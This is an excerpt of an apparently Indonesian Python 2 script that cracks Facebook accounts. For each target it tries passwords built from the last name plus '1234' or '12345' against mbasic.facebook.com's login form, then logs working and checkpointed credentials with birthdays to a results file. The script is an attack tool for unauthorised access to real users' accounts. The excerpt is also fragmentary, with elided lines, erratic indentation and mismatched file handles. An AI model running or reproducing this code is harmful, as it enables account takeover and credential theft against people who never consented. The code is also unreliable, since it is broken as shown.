...
##### MAIN INDONESIA #####
										...
										if 'checkpoint' in xo:
			                                ...
			                                if 'mbasic_logout_button' in xo or 'save-device' in xo:
				                                ...
				                                if 'checkpoint' in xo:
					                                ...
					                                pw6 = v['last_name']+'1234'
			                                        rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			                                        xo = rex.content
			                                        if 'mbasic_logout_button' in xo or 'save-device' in xo:
				                                        print '\033[1;92m --> ' + em + '|' + pw6 + '|' + c['birthday']
				                                        oke = open('done/indo.txt', 'a')
				                                        cek.write("\n[Berhasil]:" +em+ " pw:" +pw6+ " TTL:" +c['birthday'])
				                                        oke.close()
				                                        oks.append(em)
			                                        else :
				                                        if 'checkpoint' in xo:
					                                        print '\033[1;92m --> ' + em + '|' + pw6 + '|' + c['birthday']
					                                        cek = open('done/indo.txt', 'a')
					                                        cek.write("\n[Cekpoint]:" +em+ " pw:" +pw6+ " TTL:" +c['birthday'])
					                                        cek.close()
					                                        cekpoint.append(em)
					                                    else:
					                                        pw7 = v['last_name']+'12345'
			                                                rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
			                                                xo = rex.content
			                                                if 'mbasic_logout_button' in xo or 'save-device' in xo:
				                                                print '\033[1;92m --> ' + em + '|' + pw7 + '|' + c['birthday']
				                                                oke = open('done/indo.txt', 'a')
				                                                cek.write("\n[Berhasil]:" +em+ " pw:" +pw7+ " TTL:" +c['birthday'])
				                                                oke.close()
				                                                oks.append(em)
			                                                else :
				                                                if 'checkpoint' in xo:
					                                                print '\033[1;92m --> ' + em + '|' + pw7 + '|' + c['birthday']
					                                                cek = open('done/indo.txt', 'a')
					                                                cek.write("\n[Cekpoint]:" +em+ " pw:" +pw7+ " TTL:" +c['birthday'])
					                                                cek.close()
					                                                cekpoint.append(em)
		except:
			pass
	...
	print '\033[0;97m• \033[0;93mSelesai ...'
	print"\033[0;97m• \033[0;93mTotal \033[0;92mOK\033[0;97m/\x1b[0;93mCP \033[0;97m: \033[0;92m"+str(len(oks))+"\033[0;97m/\033[0;93m"+str(len(cekpoint))
	print '\033[0;97m• \033[0;92mOK\033[0;97m/\x1b[0;93mCP \033[0;93mfile tersimpan \033[0;91m: \033[0;92mdone/follow.txt'
	print 50* "\033[0;97m─"
	raw_input("\033[0;97m< \033[0;97mKembali\033[0;97m >")
	os.system("python2 pler.py")
